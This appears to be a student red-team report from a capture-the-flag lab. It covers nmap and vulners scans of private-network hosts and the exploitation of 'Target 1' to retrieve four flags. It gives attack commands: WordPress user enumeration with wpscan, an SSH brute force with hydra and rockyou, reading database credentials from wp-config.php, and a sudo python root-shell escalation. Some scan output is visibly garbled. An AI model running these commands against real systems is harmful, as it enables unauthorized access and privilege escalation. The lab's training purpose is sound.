# Red Team: Summary of Operations

## Table of Contents
- Exposed Services
- Critical Vulnerabilities
- Exploitation

### Exposed Services

Nmap scan results for each machine reveal the below services and OS details:

```bash
$ nmap -ss -sv -Pn -n -0 192.168.1.ø/24
Starting Nmap 7.80 ( https://nmap.org ) at 2021-03-19 20:58 PDT
Nmap scan report for 192.168.1.1
Host is up (0.00047s latency).
Not shown: 995 filtered ports
PORT STATE SERVICE VERSION
135/tcp open msrpc Microsoft Windows RPC 
139/tcp open netbios-ssn Microsoft Windows netbios-ssn 
445/tcp open microsoft-ds? 
2179/tcp open vmrdp? 
3389/tcp open ms-wbt-server Microsoft Terminal Services 
MAC Address: 00:15:50:00:04:0D (Microsoft) 
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port! 
Device type: general purpose 
Running (JUST GUESSING): Microsoft Windows XP 72008 (87%) 
OS CPE: cpe:/o:microsoft:windows_xp :: sp2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_server_2008 :: sp1 cpe:/o:microsoft:windows_serv er_2008:r2 
Aggressive os guesses: Microsoft Windows XP SP2 (87%), Microsoft Windows 7 (85%), Microsoft Windows Server 2008 SP1 or Windows Server 2008 R2 (85%) 
No exact OS matches for host (test conditions non-ideal). 
Network Distance: 1 hop 
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Nmap scan report for 192.168.1.100 
Host is up (0.00055s latency). 
Not shown: 998 closed ports 
PORT STATE SERVICE VERSION 
22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 
9200/tcp open http Elasticsearch REST API 7.6.1 (name: elk; cluster: elasticsearch; Lucene 8.4.0) 
MAC Address: 4C:EB:42:02:05:07 (Intel Corporate) 
No exact OS matches for host (If you know what os is running on it, see https://nmap.org/submit/ ). 
TCP/IP fingerprint: 
OS:SCAN(VEZ.80%E=4%D=3/19%OT=22%CT=1%CU=37956%PV=Y%DS=1%DC=D%G=Y%M=4CEB42%T 
OS:M=605572F8%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10C%TI=Z%CI=Z%II=I 
OS:%TS=A)OPS(01=M5B4ST11NW7%02=M5B4ST11NW7%03=M5B4NNT11NW7%04=M5B4ST11NW7%O 
OS:5=M5B4ST11NW7%06=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6 
OS:=FE88 ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5B4NNSNW7%CC=YXQ=)T1(R=Y%DF=Y%T=40%S=0 OS:%A=S+%F=AS%RD=0%Q=)T2(REN)T3(R=N T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RDE 
OS:0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%0=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0% 
OS:S=A%A=ZXF=R%0=%RD=0%Q=)17(R=Y%DF=Y%T=40%W=0%S-Z%AES+%F=AR%0=%RD=0%Q=)U1(
OS: R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G)IRUDEGIER=Y%DFI= 
OS:N%T=40%CD=S)

Network Distance: 1 hop 
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for 192.168.1.105 
Host is up (0.00048s latency). 
Not shown: 998 closed ports 
PORT STATE SERVICE VERSION 
22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 
80/tcp open http Apache httpd 2.4.29 
MAC Address: 00:15:50:00:04:0F (Microsoft) 
No exact Os matches for host (If you know what os is running on it, see https://nmap.org/submit/ ). 
TCP/IP fingerprint: 
OS:SCANV=7.80%E=4%D=3/19%OT-22%CT=1%CU=35784%PV=Y%DS=1%DC=D%G=Y%M=00155D%T 
OS:M=605572F8%P=x86_64-pc-linux-gnu)SEQTSP=105%GCD=1%ISR=10D%TIEZ%CI=Z%IINI 
OS:%TS=AOPS(01=M5B4ST11NW7%02=M5B4ST11NW7%03=M5B4NNT11NW7%04=M5B4ST11NW7%0 
OS:5=M5B4ST11NW7%06=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6 
OS:=FE88ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5B4NNSNW7%CC=YXQ=)T1(R=Y%DF=Y%T=40%S=0 
OS:%A=S+XF=AS%RD=0%Q=)T2(REN)T3(REN T4(R=Y%DF=Y%T=40%W=0%S=A%A=ZXF=R%0=%RD= 
OS:0%QT5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=ARXO=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0% 
OS:S=A%A=ZXF=R%0=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S-Z%AES+%F=AR%0=%RD=0%Q=)U1G 
OS:R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=GXRUCK=GXRUDEG)IE(R=Y%DFI=
OS:N%T=40%CD=S)

Network Distance: 1 hop 
Service Info: Host: 192.168.1.105; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for 192.168.1.110 
Host is up (0.00069s latency). 
Not shown: 995 closed ports 
PORT STATE SERVICE VERSION 
22/tcp open ssh OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0) 
80/tcp open http Apache httpd 2.4.10 ((Debian)) 
111/tcp open rpcbind 2-4 (RPC #100000) 
139/tcp open netbios-ssn Samba smbd 3.X - 4.x (workgroup: WORKGROUP) 
445/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 
MAC Address: 00:15:50:00:04:10 (Microsoft) 
Device type: general purpose 
Running: Linux 3.X|4.X 
OS CPE: cpe:/o:linux:linux kernel:3 cpe:/o:linux:linux_kernel:4 
OS details: Linux 3.2 - 4.9 
Network Distance: 1 hop 
Service Info: Host: TARGET1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for 192.168.1.115 
Host is up (0.00060s latency). 
Not shown: 995 closed ports 
PORT STATE SERVICE VERSION 
22/tcp open ssh OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0) 
80/tcp open http Apache httpd 2.4.10 ((Debian)) 
111/tcp open rpcbind 2-4 (RPC #100000) 
139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 
445/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
MAC Address: 00:15:50:00:04:11 (Microsoft) 
Device type: general purpose 
Running: Linux 3.X|4.X 
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 
OS details: Linux 3.2 - 4.9 
Network Distance: 1 hop 
Service Info: Host: TARGET2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for 192.168.1.90 
Host is up (0.000037s latency). 
Not shown: 999 closed ports 
PORT STATE SERVICE VERSION 
22/tcp open ssh OpenSSH 8.1p1 Debian 5 (protocol 2.0) 
Device type: general purpose 
Running: Linux 2.6.X 
OS CPE: cpe:/o:linux:linux kernel :2.6.32 
OS details: Linux 2.6.32 
Network Distance: 0 hops 
Service Info: OS: Linux; CPE: cpe:/o:linux:linux kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/. Nmap done: 256 IP addresses (6 hosts up) scanned in 42.64 seconds 
```

This scan identifies the services below as potential points of entry:
- Target 1
  - Port 22 OpenSSH 6.7p1 Debian 5+de8u4 (protocol 2.0)
  - Port 80 Apache httpd 2.4.10 ((Debian))
  - Port 111 rpcbind
  - Port 139 Samba smbd 3.x - 4.x
  - Port 445 Samba smbd 3.x - 4.x 

The following vulnerabilities were identified on each target:
- Target 1
  - Enumerable users
  - Brute forceable SSH password
  - Insecure SQL Password Storage
  - Improper sudoers file configuration

Results of an nmap vulnerability scan: `nmap -sV --script=vulners -v 192.168.1.110
```bash
| vulners:
|	cpe:/a: openbsd: openssh:6.7p1:
|		CVE-2015-5600	8.5	https://vulners.com/cve/CVE-2015-5600 
|		EDB-ID:40888	7.8	https://vulners.com/exploitdb/EDB-ID:40888 *EXPLOIT* 
|		EDB-ID:41173	7.2	https://vulners.com/exploitdb/EDB-ID:41173 *EXPLOIT* 
|		CVE-2015-6564	6.9	https://vulners.com/cve/CVE-2015-6564 
|		CVE-2018-15919	5.0	https://vulners.com/cve/CVE-2018-15919, 
|		CVE-2017-15906	5.0	https://vulners.com/cve/CVE-2017-15906 
|		SSV:90447	4.6	https://vulners.com/seebug/SSV:90447 *EXPLOIT* 
|		EDB-ID:45233	4.6	https://vulners.com/exploitdb/EDB-ID:45233 *EXPLOIT* 
|		EDB-ID:45210	4.6	https://vulners.com/exploitdb/EDB-ID:45210 *EXPLOIT* 
|		EDB-ID:45001	4.6	https://vulners.com/exploitdb/EDB-ID:45001 *EXPLOIT* 
|		EDB-ID:45000	4.6	https://vulners.com/exploitdb/EDB-ID:45000 *EXPLOIT* 
|		EDB-ID:40963	4.6	https://vulners.com/exploitdb/EDB-ID:40963 *EXPLOIT* 
|		EDB-ID:40962	4.6	https://vulners.com/exploitdb/EDB-ID:40962 *EXPLOIT* 
|		CVE-2016-0778	4.6	https://vulners.com/cve/CVE-2016-0778 
|		CVE-2020-14145	4.3	https://vulners.com/cve/CVE-2020-14145 
|		CVE-2015-5352	4.3	https://vulners.com/cve/CVE-2015-5352, 
|		CVE-2016-0777	4.0	https://vulners.com/cve/CVE-2016-0777
|		CVE-2015-6563	1.9	https://vulners.com/cve/CVE-2015-6563 
80/tcp	open	http		Apache httpd 2.4.10 (Debian)
|_http-server-header: Apache/2.4.10 (Debian)
| vulners:
|	cpe:/a: apache:http_server:2.4.10:
|		CVE-2017-7679	7.5	https://vulners.com/cve/CVE-2017-7679 
|		CVE-2017-7668	7.5	https://vulners.com/cve/CVE-2017-7668 
|		CVE-2017-3169	7.5	https://vulners.com/cve/CVE-2017-3169, 
|		CVE-2017-3167	7.5	https://vulners.com/cve/CVE-2017-3167 
|		CVE-2018-1312	6.8	https://vulners.com/cve/CVE-2018-1312 
|		CVE-2017-15715	6.8	https://vulners.com/cve/CVE-2017-15715 
|		CVE-2017-9788	6.4	https://vulners.com/cve/CVE-2017-9788 
|		CVE-2019-0217	6.0	https://vulners.com/cve/CVE-2019-0217 
|		EDB-ID:47689	5.8	https://vulners.com/exploitdb/EDB-ID:47689 *EXPLOIT* 
|		CVE-2020-1927	5.8	https://vulners.com/cve/CVE-2020-1927 
|		CVE-2019-10098	5.8	https://vulners.com/cve/CVE-2019-10098 
|		1337DAY-ID-33577	5.8	https://vulners.com/zdt/1337DAY-ID-33577 *EXPLOIT* 
|		CVE-2016-5387	5.1	https://vulners.com/cve/CVE-2016-5387 
|		SSV:96537	5.0	https://vulners.com/seebug/SSV:96537 *EXPLOIT* 
|		MSF: AUXILIARY/SCANNER/HTTP/APACHE_OPTIONSBLEED	5.0	https://vulners.com/metasploit/MSF:AUXILIARY/SCANNER/HTTP/APACHE_OPTIONSBLE *EXPLOIT* 
|		EXPLOITPACK:DAED9B9E8D259B28BF72FC7FDC4755A7	5.0	https://vulners.com/exploitpack/EXPLOITPACK:DAED9B9E8D259B28BF72FC7FDC4755A *EXPLOIT* 
|		EXPLOITPACK:C8C256BEQBFF5FE1C0405CBOAA9C075D	5.0	https://vulners.com/exploitpack/EXPLOITPACK:C8C256BE%BFF5FE1C0405CBOAA9C075 *EXPLOIT* 
|		CVE-2020-1934	5.0	https://vulners.com/cve/CVE-2020-1934 
|		CVE-2019-9220	5.0	https://vulners.com/cve/CVE-2019-0220
|		CVE-2018-17199	5.0	https://vulners.com/cve/CVE-2018-17199 
|		CVE-2018-17189	5.0	https://vulners.com/cve/CVE-2018-17189 
|		CVE-2018-1303	5.0	https://vulners.com/cve/CVE-2018-1303 
|		CVE-2017-9798	5.0	https://vulners.com/cve/CVE-2017-9798 
|		CVE-2017-15710	5.0	https://vulners.com/cve/CVE-2017-15710 
|		CVE-2016-8743	5.0	https://vulners.com/cve/CVE-2016-8743 
|		CVE-2016-2161	5.0	https://vulners.com/cve/CVE-2016-2161 
|		CVE-2016-0736	5.0	https://vulners.com/cve/CVE-2016-0736 
|		CVE-2015-3183	5.0	https://vulners.com/cve/CVE-2015-3183 
|		CVE-2015-0228	5.0	https://vulners.com/cve/CVE-2015-0228 
|		CVE-2014-3583	5.0	https://vulners.com/cve/CVE-2014-3583 
|		1337DAY-ID-28573	5.0	https://vulners.com/zdt/1337DAY-ID-28573 *EXPLOIT* 
|		1337DAY-ID-26574	5.0	https://vulners.com/zdt/1337DAY-ID-26574 *EXPLOIT* 
|		EDB-ID:47688	4.3	https://vulners.com/exploitdb/EDB-ID:47688 *EXPLOIT* 
|		CVE-2020-11985	4.3	https://vulners.com/cve/CVE-2020-11985 
|		CVE-2019-10092	4.3	https://vulners.com/cve/CVE-2019-10092 
|		CVE-2018-1302	4.3	https://vulners.com/cve/CVE-2018-1302 
|		CVE-2018-1301	4.3	https://vulners.com/cve/CVE-2018-1301 
|		CVE-2016-4975	4.3	https://vulners.com/cve/CVE-2016-4975 
|		CVE-2015-3185	4.3	https://vulners.com/cve/CVE-2015-3185 
|		CVE-2014-8109	4.3	https://vulners.com/cve/CVE-2014-8109 
|		1337DAY-ID-33575	4.3	https://vulners.com/zdt/1337DAY-ID-33575 *EXPLOIT* 
|		CVE-2018-1283	3.5	https://vulners.com/cve/CVE-2018-1283 
|		CVE-2016-8612	3.3	https://vulners.com/cve/CVE-2016-8612 
|		PACKETSTORM:140265	0.0	https://vulners.com/packetstorm/PACKETSTORM:140265 *EXPLOIT* 
|		EDB-ID:42745	0.0	https://vulners.com/exploitdb/EDB-ID:42745 *EXPLOIT* 
|		EDB-ID:40961	0.0	https://vulners.com/exploitdb/EDB-ID:40961 *EXPLOIT* 
|		1337DAY-ID-601	0.0	https://vulners.com/zdt/1337DAY-ID-601 *EXPLOIT* 
|		1337DAY-ID-2237	0.0	https://vulners.com/zdt/1337DAY-ID-2237 *EXPLOIT* 
|		1337DAY-ID-1415	0.0	https://vulners.com/zdt/1337DAY-ID-1415 *EXPLOIT*
|		1337DAY-ID-1161	0.0	https://vulners.com/zdt/1337DAY-ID-1161 *EXPLOIT* 
111/tcp open	rpcbind	2-4 (RPC #100000)
| rpcinfo:
|	program	version	port/proto	service 
|	100000	2,3,4	111/tcp	rpcbind
|	100000	2,3,4	111/udp rpcbind
|	100000	3,4	111/tcp6	rpcbind
|	100000 3,4	111/udp6	rpcbind
|	100024	1	40798/udp6	status
|	100024	1	47424/tcp6	status
|	100024	1	48266/udp	status
|	100024	1	59154/tcp	status
```

### Exploitation

The Red Team was able to penetrate `Target 1` and retrieve the following confidential data:
- Target 1
  - `flag1.txt`: flag1{b9bbcb33e11b80be759c4e844862482d}
    - **Enumerable users**
      - WordPress allows an attacker to enumerate valid usernames in a brute force attack.
      - Command run: `wpscan --url 192.168.1.110/wordpress --enumerate u`
  - `flag2.txt`: flag2{fc3fd58dcdad9ab23faca6e9a36e581c}
    - **Brute forceable SSH password**
      - The password for user michael is weak and easily brute forced
      - `hydra -l michael -P /usr/share/wordlists/rockyou.txt -s 22 -f -vv 192.168.1.110 ssh`
  - `flag3.txt`: flag3{afc01ab56b5091e7dccf93122770cd2}
    - **Insecure Password Storage**
      - The password to the Wordpress server's SQL database is stored in cleartext in wp-config.php
      - Command run: `nano /var/www/html/wordpress/wp-config.php`
  - `flag4.txt`: flag4{715dea6c055b9fe3337544932f2941ce}
    - **Improper sudoers file configuration**
      - The sudoers file allowed user steven to perform a privelege escalation by letting him run `python` as root
      - Command run: `sudo python -c 'import pty; pty.spawn("/bin/bash")'`